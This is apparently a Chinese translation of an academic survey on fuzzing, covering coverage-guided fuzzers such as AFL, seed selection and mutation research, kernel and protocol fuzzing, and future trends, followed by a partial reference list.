<p><strong>符号执行</strong><br>符号执行是一种被认为是非常有前途的漏洞挖掘技术。通过符号化程序输入，符号执行为每个执行路径维护一组约束条件。执行之后，将使用约束求解器来求解约束，并确定由哪些输入导致这条路径被执行。从理论上讲，符号执行可以覆盖程序中的任何执行路径，在小程序测试中表现出良好的效果，但也存在许多局限性。首先，路径爆炸问题。随着程序规模的扩大，执行状态也随之爆炸，超出了约束求解器的求解能力。第二，环境相互作用。在符号执行中，当目标程序与符号执行环境之外的组件（如系统调用、处理信号等）交互时，可能会出现问题。前人的工作已经证明，符号执行目前仍然很难应用到大型应用程序上。</p>
<p><strong>模糊测试</strong><br>Fuzz 是目前最流行的漏洞发现技术。模糊测试是20世纪90年代由美国威斯康星州大学的Barton Miller首次提出的，模糊测试产生大量的正常和异常输入，通过将生成的内容反馈给目标应用程序并监控执行状态来检测是否触发异常。与其他技术相比，fuzz 技术易于部署，具有良好的可扩展性和适用性，可以在有源代码或无源代码的情况下执行。此外，由于模糊测试基于程序的正常运行过程，因此具有较高的精度。fuzz 可以很容易地应用到大规模应用程序上。尽管模糊测试技术面临着效率低、代码覆盖率低等诸多缺点，但模糊技术已经成为目前最有效、最先进的漏洞发现技术之一。</p>
<p>表1显示了不同技术的优缺点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey1.png"
                     
                ></p>
<p><strong>模糊测试(Fuzzing)</strong></p>
<p><strong>模糊测试的执行过程</strong><br>图 1 描述了传统模糊测试的主要过程。工作过程主要由四个阶段组成：测试用例生成阶段、测试用例运行阶段、程序执行状态监控和异常分析。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey2.png"
                     
                ></p>
<p>模糊测试从一堆程序输入的生成开始。生成测试用例的质量直接影响测试效果。输入应尽可能满足测试程序对输入格式的要求。另一方面，输入也不能过于遵守输入格式的要求，这些经过特殊处理的输入很可能会导致程序崩溃。根据目标程序的不同，输入可以是不同格式的文件、网络通信数据、具有指定特性的可执行二进制文件等。如何生成足够好的测试用例是模糊测试面临的主要挑战。一般来说，有两种常用的生成器：基于生成的生成器和基于变异的生成器。<br>测试用例在生成后被送到目标程序。fuzzers 自动启动和终止目标程序，并驱动目标程序的测试用例处理过程。在执行之前，分析人员可以配置目标程序的启动和终止方式，并预定义参数和环境变量。通常，模糊测试过程在超时、程序挂起或崩溃的时候停止。</p>
<p>Fuzzer 在目标程序执行期间监视执行状态，期望出现异常和崩溃。常用的异常监视方法包括监视特定的系统信号、崩溃和其他行为。对于没有直观表现的异常，可以使用第三方工具，包括 AddressSanitizer，DataflowSanitizer，ThreadSanitizer，LeakSanitizer 等。当异常被捕获时，fuzzer 会存储相应的测试用例以供回放和分析。</p>
<p>在分析阶段，分析人员试图确定捕获的异常的位置和原因。分析通常在调试程序的帮助下进行，如gdb、windbg或其他二进制分析工具，如ida pro、ollydbg等。二进制检测工具，如 Pin。自动崩溃分析是另一个重要的研究领域。</p>
<p><strong>Fuzzer 的类型</strong><br>Fuzzer 可以分为基于生成和基于突变两种。对于基于生成的 fuzzer，需要了解程序的构成(知识)。例如对于文件格式 fuzz，通常提供预先定义文件格式的配置文件。根据配置文件生成测试用例。这些测试用例由于有配置文件的约束，能够更容易地通过程序验证，更有可能测试目标程序的深层代码。然而，在没有可用的配置文件、说明文档情况下，分析待测程序的测试用例格式是一项艰巨的工作。因此，基于突变的 fuzzer 被更为广泛的采用。</p>
<p>对于基于突变的 fuzzer 来说，初始条件下需要一组有效的输入。测试用例是通过初始输入和 fuzz 过程中生成的测试用例的变异而生成的。我们在表2中比较了基于生成的 fuzzer 和基于变异的 fuzzer 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey4.png"
                     
                ><br>根据对程序源代码的依赖性和程序分析的程度，fuzzer 可以分为白盒、灰盒和黑盒。基于白盒的 fuzzer 可以访问程序的源代码，因此可通过分析源代码以及测试用例如何影响程序的运行状态来收集更多的信息。黑盒 fuzzer 在不了解目标程序内部结构的情况下进行模糊测试。灰盒 fuzzer 也不需要源代码，通过程序分析获得目标程序的内部信息。我们在表3中列出了一些常见的白盒、灰盒和黑盒 fuzzer。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey3.png"
                     
                ></p>
<p>根据开发的策略，还可以将 fuzzer 分为定向 fuzzer 和基于覆盖的 fuzzer。定向 fuzzer 的目标是生成覆盖程序目标代码和目标路径的测试用例，而基于覆盖的 fuzzer 的目标是生成覆盖尽可能多的程序代码的测试用例。定向 fuzzer 目的是对程序进行更快的测试，而基于覆盖的 fuzzer 目的是进行更彻底的测试，并尽可能地检测出更多的错误。无论是定向 fuzzer 还是基于覆盖的fuzzer，如何提取执行路径信息是关键问题。</p>
<p>根据对程序执行状态的监控与测试用例生成之间是否存在反馈，fuzzer 可以分为硬核 fuzzer 和智能 fuzzer。智能 fuzzer 根据收集到的测试用例如何影响程序行为的信息来调整测试用例的生成。对于基于变异的 fuzzer，反馈信息可以用来确定测试用例的哪一部分应该被变异以及变异它们的方式。硬核 fuzzer 具有更好的测试速度，而智能 fuzzer 可以生成更好的测试用例并获得更好的效率。</p>
<p><strong>Fuzz 中的关键问题</strong><br>传统的 fuzz 算法在实际应用中通常采用基于随机的 fuzz 策略。由于程序分析技术的局限，导致 fuzzer 不够智能。因此模糊测试仍然面临许多挑战。我们列出一些关键问题如下。</p>
<p>如何变异种子输入？基于变异的生成策略以其方便、易设置等优点被现代 fuzzer 广泛应用。然而，如何变异和生成能够覆盖更多程序路径和更容易触发错误的测试用例是一个关键问题。具体来说，基于变异的 fuzzer 在进行变异时需要回答两个问题：<br>（1）在哪里变异？<br>（2）如何变异？<br>只有几个关键位置上的变化才会影响程序的控制流。因此，如何在测试用例中定位这些关键位置是非常重要的。此外，fuzzer 在关键位置上如何变异是另一个关键问题，即如何确定可以引导程序到达脆弱路径的值。总之，测试用例的盲目变异导致测试资源的严重浪费，更好的变异策略可以显著提高 fuzz 的效率。</p>
<p>低代码覆盖率的问题？代码覆盖率越高表示程序执行状态的覆盖率越高，测试也越彻底。以前的工作已经证明，更高的覆盖率会得到更高的找到错误的概率。然而，大多数测试用例只覆盖少数路径，而多数代码无法访问。因此，仅仅通过大量的测试用例生成和投入测试资源来实现高覆盖率并不是一个明智的选择。基于覆盖的 fuzzer 试图借助程序分析技术（如程序插装）来解决这个问题。我们将在下一节介绍细节。</p>
<p>通过验证的问题？程序通常在解析和处理数据之前验证。验证起到保护程序的作用，节省了计算资源，保护程序免受无效输入和恶意构造的输入造成损坏。无效的测试用例总是被忽略或丢弃。<br>幻数、特定的字符串、版本号检查和校验和是程序中常用的验证方法。由黑盒和灰盒 fuzzer 生成的测试用例很难通过这些验证，导致 fuzz 效率很低。因此，如何通过验证是另一个关键挑战。</p>
<p>为了应对这些问题，人们提出了各种方法，既有传统的技术，如程序检测和污染分析，也有新的技术，如 RNN 和LSTM。这些技术的原理将在“技术融合”一节中讨论。</p>
<p><strong>基于覆盖率的模糊测试</strong></p>
<p>基于覆盖的 fuzz 策略被现代 fuzzer 广泛应用，并被证明是非常有效的。为了实现一个深入而彻底的 fuzz 过程，fuzzer 应该尝试遍历尽可能多的程序运行状态。然而，由于程序行为的不确定性，程序状态不存在简单的度量标准。此外，一个好的度量标准应该在进程运行期间容易被确定。因此，代码覆盖率成为近似的度量方案。使用这种方案，代码覆盖率的增加表示程序进入新的状态。此外，通过编译内部和外部工具，代码覆盖率可以很容易地测量。我们认为代码覆盖是一种近似的度量标准，因为在实践中，一个固定的代码覆盖率并不表示一个连续的程序状态。使用此度量标准可能会导致某些信息丢失。在这一部分中，我们以 afl 为例说明。</p>
<p><strong>代码覆盖率测量</strong><br>在程序分析中，程序由基本块组成。基本块是具有单个入口和出口点的代码段，基本块中的指令将被顺序执行，并且只执行一次。在代码覆盖率测量中，最新的方法是以基本块作为最佳粒度。其原因包括：<br>（1）基本块是程序执行的最小相干单元；<br>（2）测量函数或指令会导致信息丢失或冗余；<br>（3）基本块可以通过第一条指令的地址来识别，并且基本块信息可以通过代码检测来轻松提取。<br>目前，有两种基于基本块的测量方法，统计被执行的基本块数量、统计基本块之间转换的次数。在后一种方法中，程序被解释为一个图，节点被用来表示基本块，边被用来表示基本块之间的转换。实验表明，简单地计算已执行的基本块将导致严重的信息丢失。如图2所示，如果首先执行程序路径（bb1、bb2、bb3、bb4），然后执行路径（bb1、bb2、bb4），则丢失新边（bb2、bb4）信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey5.png"
                     
                ></p>
<p>AFL 第一次将边(edge)测量方法引入到基于覆盖的 fuzz 中。以 afl 为例说明基于覆盖的 fuzzer 在模糊测试过程中如何获取代码覆盖率信息。<br>afl通过轻量级程序插桩获得代码覆盖率信息。根据是否提供源代码，afl提供了两种插装模式：编译插装和外部插装。根据我们使用的编译器，在编译插桩模式下编译时，afl同时提供gcc和llvm支持，这将在生成二进制文件时插入检测代码片段。<br>在外部模式下，afl提供qemu模式，当基本块转换为tcg块时将检测代码片段。</p>
<p>片段 1 显示了插入指令的代码片段的伪代码。在指令插入技术中，一个随机 ID，即变量 cur_location 被插入到基本块中。变量 shared_mem 数组是一个64 KB的共享内存区域，其中每个字节都映射到一个特定边的命中（bb_src，bb_dst）例如(BB2, BB4)。当基本块转换发生时，将计算哈希值，并更新数组中相应的字节值。图3描述了散列和位图的映射。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey6.png"
                     
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey7.png"
                     
                ><br><strong>基于覆盖率的 fuzz 流程</strong></p>
<p>算法1给出了基于覆盖的 fuzzer 的一般工作过程。测试从初始给定的种子输入开始。如果种子输入集没有给定，那么fuzzer自己构造一个。在主循环中，fuzzer 反复选择一个种子用于后续的变异和测试用例生成。然后驱动目标程序在fuzzer的监控下执行生成的测试用例。收集触发崩溃的测试用例，并将其他有趣的用例添加到种子池中。对于基于覆盖的 fuzzer，能够触发新控制流的测试用例被认为是有趣的。主循环在预先配置的超时或中止信号时停止。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey8.png"
                     
                ></p>
<p>在 fuzz 过程中，fuzzer 通过各种方法跟踪执行。基本上，fuzzer 跟踪执行有两个目的，代码覆盖率和异常捕获。代码覆盖率信息用于进行彻底的程序状态探索，而异常跟踪是为了更好地发现错误。如前一小节所述，afl通过代码插桩和afl位图跟踪代码覆盖率。<br>图4显示了AFL的工作过程，AFL是一种非常有代表性的基于覆盖率的 fuzzer 。目标应用程序执行前被插桩。如前所述，afl支持编译时插桩和外部插桩，使用gcc&#x2F;llvm模式和qemu模式。还应提供初始种子输入。在主循环中，<br>（1）fuzzer 根据种子选择策略从种子池中选择最合适的种子，afl选择最快和最小的种子。<br>（2）根据变异策略对种子文件进行变异，生成一批测试用例。AFL目前采用了一些随机修改和测试用例拼接的方法，包括可变长度和步长的顺序位翻转、小整数的顺序加减和已知有趣整数的顺序插入，如0，1，int_max，etc.<br>（3）测试用例放入程序，fuzzer 跟踪执行过程。收集覆盖率信息以确定有趣的测试用例，即到达新控制流的测试用例。有趣的测试用例被添加到种子池中，以供下一轮运行。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey9.png"
                     
                ></p>
<p><strong>关键问题</strong><br>前面的介绍表明，要运行一个高效的基于覆盖率的 fuzzer 需要解决很多问题。围绕这些问题进行了许多探索。我们在本小节中总结并列举一些最新的工作成果，如表4所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey10.png"
                     
                ><br>问题A：如何获得初始输入？<br>大多数最先进的基于覆盖率的 fuzzer 采用基于变异的测试用例生成策略，这在很大程度上取决于初始种子输入的质量。良好的初始种子输入可以显著提高 fuzz 的效率和有效性。具体来说，<br>（1）提供格式良好的种子输入可以节省构建一个种子所需的大量CPU时间<br>（2）良好的初始输入可以满足复杂文件格式的要求<br>（3）基于格式良好的种子输入的变异更有可能生成更深入的测试用例。从而到达难以到达的路径<br>（4）良好的种子输入可以在多次测试中重复使用</p>
<p>收集种子输入的常用方法包括使用标准数据、从因特网上抓取、使用现有的POC样本。开放源代码的应用程序在发布同时会附带一个用于测试程序功能的基准数据。这些数据是根据应用程序的特性和功能构建的，这些特性和功能自然地构建了一组良好的种子输入。考虑到目标应用输入的多样性，从网络抓取是最直观的方法。我们可以轻松下载具有特定格式的文件。此外，对于一些常用的文件格式，网络上有许多开放的测试项目提供免费的测试数据集。使用现有的POC样本也是一个好主意。然而，种子输入量过大会造成第一次运行的时间浪费，由此带来另一个问题，即如何提取原始语料。afl提供了一个工具，它用于提取实现相同代码覆盖率的最小输入集。</p>
<p>问题B：如何生成测试用例？<br>测试用例的质量是影响 fuzz 效率和有效性的重要因素。首先，好的测试用例可以探索到更多的程序执行状态，并在更短的时间内覆盖更多的代码。此外，好的测试用例可以瞄准潜在的易受攻击的位置，从而更快地发现程序错误。因此，如何基于种子输入生成良好的测试用例是一个重要的问题。</p>
<p>Rawat 等人（2017）提出了 Vuzzer，一种结合静态和动态分析的应用感知灰盒 fuzzer。种子输入的变异涉及到两个关键问题：在哪里变异以及变异成什么。具体来说，Vuzzer 在进入主循环之前通过静态分析提取即时值、幻数值和其他影响控制流的特征字符串。在程序执行过程中，Vuzzer 使用动态污点分析技术来收集影响控制流分支的信息，包括特定值和相应的偏移量。Vuzzer 通过对收集到的值进行变异，并在识别的位置进行变异，可以生成更符合分支判断条件的测试用例，并通过程序验证。但是，Vuzzer 仍然无法在程序中通过其他类型的验证，例如基于哈希的校验和。Vuzzer 的插桩模块、主循环等模块是基于 Pin 实现的，与AFL相比速度更慢。</p>
<p>Wang等人（2017）提出的 Skyfire 是一种数据驱动的种子生成解决方案。Skyfire从爬取的输入中学习概率上下文敏感语法（PCSG），并在生成输入时利用所学知识。实验表明，Skyfire生成的测试用例覆盖的代码比AFL多，发现的错误也多。同时也证明了测试用例的质量是影响 fuzz 效率和有效性的重要因素。</p>
<p>随着机器学习技术的发展和广泛应用，一些研究者试图利用机器学习技术来辅助测试用例的生成。Godefraoid 等人使用基于神经网络的统计机器学习技术-NIQUES自动生成测试用例。具体来说，他们首先通过机器学习技术从一堆有效的输入中学习输入格式，然后将学习到的知识杠杆化(?)，指导测试用例的生成。它们在微软 edge 浏览器中的 pdf 解析器上进行了 fuzz。尽管实验没有取得令人鼓舞的结果，但仍然是一个良好的思路。Rajpal 等人（2017）使用神经网络从过去的 fuzz 用例中学习，并预测输入文件中要变异的字节。Nichols 等人（2017）使用生成对抗性网络（gan）模型帮助使用新种子文件重新初始化系统。实验表明，gan比 lstm 更快、更有效，有助于发现更多的代码路径。</p>
<p>问题C：如何从种子池(seed pool)中选择种子？<br>在主循环中，新一轮测试开始时，fuzzer 从种子池中重复选择种子进行变异。如何从池中选择种子是 fuzz 中另一个重要的开放性问题。前人的工作已经证明，良好的种子选择策略可以显著提高 fuzz 效率，并有助于更快地发现更多的错误。有了良好的种子选择策略，fuzzer可以<br>（1）优先处理那些更有帮助的种子，包括覆盖更多的代码，更容易触发漏洞<br>（2）减少重复执行路径，节省计算资源<br>（3）优化选择种子，覆盖更深更易受攻击的代码，帮助更快地识别隐藏的漏洞。</p>
<p>Böhme 等人（2017）提出了基于覆盖率的灰盒 fuzzer AFLFAST。他们发现大多数测试用例都集中在相同的几个路径上。例如，在 PNG 处理程序中，通过随机变异生成的大多数测试用例都是无效的，并触发错误处理路径。aflfast 将路径分为高频率路径和低频率路径。在 fuzz 中，aflfast测量可执行路径的频率，对种子进行优先级排序，并将更多的计算资源分配给运行低频率路径的种子。</p>
<p>Rawat 等人（2017）整合静态和动态分析，以确定难以深入的路径，并优先考虑深入路径的种子。Vuzzer 的种子选择策略可以帮助找到隐藏在深层路径中的漏洞。</p>
<p>Aflgo 采用定向选择策略。它将一些易受攻击的代码定义为目标位置，并选择更接近目标位置的测试用例。aflgo文件中提到了四类易受攻击的代码，包括补丁、程序崩溃缺少足够的跟踪信息、静态分析工具验证的结果以及与敏感信息相关的代码片段。通过适当的定向算法，aflgo可以在感兴趣的代码上分配更多的测试资源。QTEP 利用静态代码分析来检测容易出错的源代码，并优先处理能够覆盖更多错误代码的种子。aflgo和qtep在很大程度上依赖于静态分析工具的有效性。然而，目前的静态分析工具的误报率仍然很高，无法给出准确的验证。</p>
<p>已知漏洞的特征也可用于种子选择策略。Slowfuzz（Petsios等人2017）的主要 fuzz 目标是复杂算法的漏洞，这些算法往往会消耗大量计算资源。因此，slowfuzz 更偏向于选择消耗更多资源（如cpu时间和内存）的种子。然而，收集消耗资源的信息会带来很大的开销，降低 fuzz 的效率。例如，为了收集cpu时间，slowfuzz 统计执行的指令数。此外，slowfuzz 对资源消耗信息的准确性要求很高。</p>
<p>问题D：如何有效地测试应用程序？<br>在主循环中，目标应用由 fuzzer 反复启动和终止。众所周知，对于用户端应用程序的 fuzz，进程的创建和终止将消耗大量的CPU时间。频繁的创建和终止进程会严重降低 fuzz 的效率。因此，人们提出了很多优化措施。afl 使用一个 forkserver 方法，该方法为已加载的程序创建一个相同的克隆体，并在每次运行时重用该克隆体。此外，afl 还提供了持久模式（persistent mode）和并行模式（parallel mode），前者有助于避免缓慢的 execve() 等系统调用和链接过程的开销，后者有助于在多核系统上并行测试。英特尔处理器跟踪（PT）（james 2013）技术用于内核 fuzz，以节省覆盖率跟踪带来的开销。Xu等人（2017）旨在解决多核机上并行 fuzz 的性能瓶颈。通过设计和实现三个新的操作原语，他们表示自己的工作可以显著加快现代 fuzzer 的速度，如 afl 和 libfuzzer。</p>
<p><strong>技术融合</strong></p>
<p>现代应用程序通常使用非常复杂的数据结构，对复杂数据结构的解析更容易带来漏洞。采用随机变异方法的 fuzz 策略将生成大量无效的测试用例，fuzz 效率低。目前最先进的 fuzzer 通常采用智能 fuzz 策略。智能 fuzzer 通过程序分析技术收集程序控制流和数据流信息，从而利用收集到的信息改进测试用例的生成。由智能 fuzzer 生成的测试用例更有针对性，更有可能满足程序对数据结构和逻辑判断的要求。图5描绘了智能 fuzzer 的草图。为了构建一个智能 fuzzer ，集成了多种技术。如前几节所述，fuzz 在实践中面临许多挑战。在这一部分中，我们试图总结以前的工作所使用的技术，以及这些技术如何在 fuzz 过程中应对挑战。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey11.png"
                     
                ></p>
<p><strong>生成测试用例</strong><br>如前所述，fuzzing 中的测试用例是用<strong>基于生成的方法</strong>或<strong>基于变异的方法</strong>生成的。如何生成满足复杂数据结构要求且更容易触发难以到达路径的测试用例是一个关键的挑战。研究者们提出了很多解决方案。<br>在基于生成的 fuzz 中，生成器根据输入数据格式和配置文件生成测试用例。例如文件处理程序，文档中仅仅提到了常用的文件格式，但是没有提到一些小众文件格式。如何获取输入的格式信息是一个很难解决的问题。一般采用机器学习技术和格式化方法来解决问题。Godefroid 等人使用机器学习技术，特别是递归神经网络，学习输入文件的语法，从而使用学习的语法生成格式合适的测试用例。Wang 等人使用格式方法，具体来说，它定义了一个概率上下文敏感语法，并提取格式知识来生成格式良好的种子输入。</p>
<p>更多最先进的 fuzzer 采用基于变异的 fuzz 策略。在变异过程中，通过修改部分种子输入来生成测试用例。在变异 fuzz 过程中，变异模块随机地将种子的字节数修改为随机值或多个特殊值，这实际上是非常低效的。因此，如何确定要修改的位置和修改时使用的值是另一个关键问题。<br>在基于覆盖的 fuzz 中，应该首先修改可能影响控制流传输的字节。污点分析技术用于跟踪字节对控制流的影响，以定位变异种子的关键字节（Rawat等2017年）。知道变异的关键位置只是开始。fuzz 过程通常在一些分支中被阻塞。例如，条件判断中的特定字节和其他值进行比较。采用逆向工程和污点分析等技术。通过扫描二进制代码，从条件判断语句中收集即时值，并在变异过程中利用选择的值作为候选值，fuzzer 可以绕过一些关键的验证和检查，如版本检查。<br>Rawat 等人（2017）尝试利用机器学习等技术解决挑战。微软的研究人员利用机器学习技术，比如深度神经网络（dnn），通过lstm，基于先前的 fuzz 经验，预测哪些字节会发生变异，在变异中使用什么值。</p>
<p><strong>程序执行</strong><br>在主循环中，目标程序被重复执行。提取程序执行状态信息，用于提高程序执行效率。在执行阶段涉及到的两个关键问题是如何指导 fuzz 过程以及如何探索新的路径。<br>我们希望 Fuzz 能够覆盖更多的代码并更快地发现错误，因此需要路径执行信息。在基于覆盖率的 fuzz 中，可以使用多种检测技术记录被执行的路径并计算覆盖率信息。根据是否提供源代码（如果提供），可使用符合要求的编译插桩和外部插桩。对于定向 fuzz，使用模式识别等静态分析技术来识别和指定目标代码，这样更容易发现脆弱点。<br>静态分析技术也可用于收集控制流信息，例如路径深度，这可作为指导测试用例生成的另一个参考。通过检测收集的路径执行信息可以帮助指导 fuzz 过程。一些新的系统特性和硬件特性也被用于执行信息的收集。英特尔处理器跟踪（Intel PT）是英特尔处理器提供的一项新功能，它具有执行速度快、不依赖源代码等优点，可以准确高效地跟踪执行过程。在 kafl 中，这一特性被用于os内核的 fuzz，并被证明是相当有效的。</p>
<p>测试执行中的另一个关注点是探索新的路径。在程序的控制流中，fuzzer 需要通过复杂的条件判断。程序分析技术包括静态分析、污点分析等，可以用来识别执行过程中的阻塞点，从而解决问题。<strong>符号执行技术在路径探索中具有天然的优势</strong>。通过求解约束集，符号执行技术可以得到满足特定条件要求的值。Taintscope（Wang等人2010）使用符号执行技术来获取程序中验证逻辑的结果。Driller（Stephens等人2016）利用混合执行绕过传统判断并发现更深层次的漏洞。<br>经过多年的发展，fuzz 技术的粒度更细、更加灵活和智能。<strong>反馈驱动</strong>的 fuzz 技术为指导测试用例生成提供了一种有效的方法。</p>
<p><strong>对不同应用进行模糊测试</strong></p>
<p>自出现以来，fuzz 技术就被用来检测大量应用程序的漏洞。根据不同应用的特点，在实际应用中采用不同的 fuzzer 和策略。</p>
<p><strong>文件格式 fuzz</strong><br>大多数应用程序都涉及文件处理，fuzz 技术在查找这些应用程序的错误时被广泛使用。模糊测试可以用标准格式或不标准格式的文件来操作。最常用的文档文件、图像和媒体文件是标准格式的文件。目前对 fuzz 的研究主要集中在文件格式的模糊化上，研究者们提出了很多 fuzz 工具，如 Peach（peachtech 2017）、最新的 afl 及其扩展（rawat等）。前面的介绍涉及到各种文件格式的fuzzer ，这里我们不再强调其他工具。</p>
<p>文件格式 fuzz 的一个重要分支是web浏览器上的 fuzz。随着 web 浏览器的发展，其功能得到了前所未有的扩展。浏览器处理的文件类型已经从传统的HTML、CSS、JS 扩展到其他类型的文件，如 PDF、SVG 等。具体来说，浏览器将 web 页面解析为dom树，dom 树将 web 页面解析为与事件和响应相关的文档对象树。浏览器的 dom 解析和页面呈现是当前比较热门的 fuzz 目标。针对 web 浏览器比较出名的 fuzz 工具包括 grinder 框架（stephenless 2016）、comraider（zimmer 2013）、bf3（aldeid 2013）等等。</p>
<p><strong>内核 fuzz</strong><br>操作系统内核的 fuzz 一直是一个难题，涉及到许多挑战。首先，与用户态 fuzzing 不同，内核中的崩溃和挂起会导致整个系统崩溃，如何捕获崩溃是一个问题。其次，系统权限机制导致了一个相对封闭的执行环境，考虑到 fuzzer 通常在 ring 3 级别中运行，如何与内核交互是另一个问题。目前与内核通信的最佳提议是调用内核API函数。此外，广泛使用的内核如 Windows 和 MacOS 都是闭源的，并且 fuzz 效率很低。但是随着智能 fuzz 技术的发展，内核 fuzz 技术也取得了一些新的进展。</p>
<p>通常， fuzz 内核的方法是<strong>随机调用</strong>具有<strong>随机生成的参数值的内核 API 函数</strong>。根据 fuzzer 的关注点，内核 fuzzer 可以分为两类：基于已知的 fuzzer 和基于覆盖率的 fuzzer 。</p>
<p>对于基于已知的 fuzzer ，使用内核 api 函数调用进行 fuzz 面临两个主要挑战：<br>（1）api调用的参数应具有遵循api规范的随机且格式良好的值<br>（2）内核api调用的顺序应看起来有效（han和cha 2017）<br>代表性工作包括Trinity（Jones 2010）和IMF（Han和Cha 2017）。trinity是一个类型感知的内核 fuzzer。在 trinity 中，根据参数类型生成测试用例。系统调用的参数根据数据类型进行修改。此外，还提供了某些枚举值和值的范围，以帮助生成格式良好的测试用例。imf 试图学习 api 执行的正确顺序和 api 调用之间的值依赖性，并将学习到的知识用于生成测试用例。</p>
<p>基于覆盖率的 fuzz 技术在发现用户应用程序漏洞方面取得了巨大的成功。人们开始将基于覆盖率的 fuzz 方法应用于内核漏洞的发现。代表性工作包括 Syzkaller（Vyukov 2015）、Triforceafl（Hertz 2015）和 Kafl（Schumilo等人2017年）。Syzkaller 通过编译为内核安装工具，并在一组 QEMU 虚拟机上运行内核。在 fuzz 过程中，覆盖范围和异常都会被跟踪。<br>Triforceafl 是 afl 的一个改进版本，它支持 qemu 全系统仿真的内核 fuzz。<br>kafl 利用新的硬件特性 intel pt 来跟踪覆盖范围，只跟踪内核代码。实验表明，kafl 的速度是 triforce 的 40 倍左右，大大提高了效率。</p>
<p><strong>协议 Fuzz</strong><br>目前，很多本地应用都是以 b&#x2F;s 模式向网络服务转化的。服务部署在网络上，客户端应用程序通过网络协议与服务器通信。<br>网络协议的安全测试成为另一个重要的关注点。如果协议中的安全问题，可能导致比本地应用程序更严重的后果，如拒绝服务、信息泄漏等。与文件格式 fuzz 相比，协议 fuzz 涉及不同的问题。首先，服务可以定义自己的通信协议，很难确定协议的标准。此外，即使是标准定义的文档化协议，在开发过程中仍然很难遵循 RFC 等规范。</p>
<p>典型的协议 fuzzer 包括 Spike，它提供了一套工具，允许用户快速创建网络协议压力测试器。serge gorbunov 和 arnold rosenbloom 提出了autofuzz（gorbunov和rosenbloom，2010），它通过构造一个有限状态自动机来学习协议实现，并利用所学知识生成测试用例。Greg Banks 等人提出 SNOOZE（Banks等人2006），它用有状态 fuzz 方法来识别协议缺陷。joeri de ruiter（de ruiter and poll 2015）提出了一种协议状态 fuzz 方法，该方法描述了状态机中 TLS 的工作状态，并根据逻辑流对其进行 fuzz 处理。之前的工作一般采用有状态的方法对协议工作过程进行建模，并根据协议规范生成测试用例。</p>
<p><strong>fuzz 技术的新趋势</strong></p>
<p>Fuzz 技术作为一种自动检测漏洞的方法，显示了其高效性和有效性。然而，正如前面提到的，仍然有许多挑战需要解决。在这一部分中，我们简要介绍了自己的理解，以供参考。</p>
<p>首先，智能 fuzzer 为改进模糊测试技术提供了更多的可能性。在以前的工作中，传统的静态分析和动态分析技术被集成到 fuzz 中。虽然取得了一定的进步，但还是有限。智能 fuzzer 通过多种方式收集目标程序的执行信息，对 fuzz 过程进行更精细的调整。随着对不同类型漏洞的深入理解，以及对 fuzz 中漏洞特征的利用，智能 fuzzer 有助于发现更复杂的漏洞。</p>
<p>第二，新技术可在许多方面帮助 fuzzer 更好的检测漏洞。如机器学习和相关的技术已经被用来改进 fuzz 中的测试用例的生成。如何将新技术的优势和特点与 fuzz 结合起来，是另一个值得思考的问题。</p>
<p>第三，不应忽视新的系统特性和硬件特性。Vyukov 和 Schumilo 的工作表明，新的硬件特性大大提高了 fuzz 的效率，给了我们很好的启发。</p>
<p><strong>结论</strong></p>
<p>模糊测试技术是目前最有效的漏洞发现方法之一。本文对 fuzz 及其最新进展进行了全面的回顾和总结。首先，我们将模糊测试技术与其他漏洞发现方法进行了比较，然后介绍了模糊测试技术的概念和关键挑战。本文着重介绍了近年来发展迅速的基于覆盖率的 fuzz 技术。最后，总结了 fuzz 技术融合、fuzz 技术的应用及可能出现的新趋势。</p>
<p><strong>Abbreviations</strong><br>AFL: American Fuzzy Lop; BB: Basic Block; DNN: Deep Neural Networks; LSTM: Long Short-Term Memory; POC: Proof of Concept<br><strong>Acknowledgements</strong><br>This research was supported in part by the National Natural Science Foundation of China (Grant No. 61772308 61472209, and U1736209), and Young Elite Scientists Spon- sorship Program by CAST (Grant No. 2016QNRC001), and award from Tsinghua Information Science And Technology National Laboratory.<br><strong>Authors’ contributions</strong><br>JL drafted most of the manuscripts, BZ helped proofreading and summarized parts of the literature, and Prof. CZ abstracted the classifier for existing solutions and designed the overall structure of the paper. All authors read and approved the final manuscript.<br><strong>Competing interests</strong><br>CZ is currently serving on the editorial board for Journal of Cybersecurity.<br><strong>Publisher’s Note</strong><br>Springer Nature remains neutral with regard to jurisdictional claims in published maps and institutional affiliations.</p>
<p><strong>References</strong><br>Aldeid (2013) Browser fuzzer 3. <a class="link"   href="https://www.aldeid.com/wiki/Bf3" >https://www.aldeid.com/wiki/Bf3<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Amini P (2017) Sulley fuzzing framework. <a class="link"   href="https://github.com/OpenRCE/sulley" >https://github.com/OpenRCE/sulley<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Banks G, Cova M, Felmetsger V, Almeroth K, Kemmerer R, Vigna G (2006) Snooze: toward a stateful network protocol fuzzer. In: International Conference on Information Security. Springer, Berlin. pp 343–358<br>Böhme M, Pham V-T, Nguyen M-D, Roychoudhury A (2017) Directed greybox fuzzing. In: Proceeding CCS ’17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York. pp 2329–2344. <a class="link"   href="https://doi.org/10.1145/3133956.3134020" >https://doi.org/10.1145/3133956.3134020<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Böhme M, Pham VT, Roychoudhury A (2017) Coverage-based greybox fuzzing as markov chain. In: Proceedings of the 2016 ACM SIGSAC Conference on 